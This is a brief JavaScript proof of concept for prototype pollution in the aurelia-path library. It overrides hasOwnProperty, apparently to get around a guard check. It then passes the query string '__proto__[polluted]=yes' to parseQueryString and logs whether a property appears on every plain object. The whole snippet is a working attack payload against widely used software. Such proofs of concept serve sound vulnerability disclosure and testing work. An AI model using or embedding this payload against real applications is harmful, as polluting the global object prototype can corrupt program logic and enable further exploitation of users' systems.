Object.prototype.hasOwnProperty.call = () => true;
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('__proto__[polluted]=yes');
console.log({}.polluted);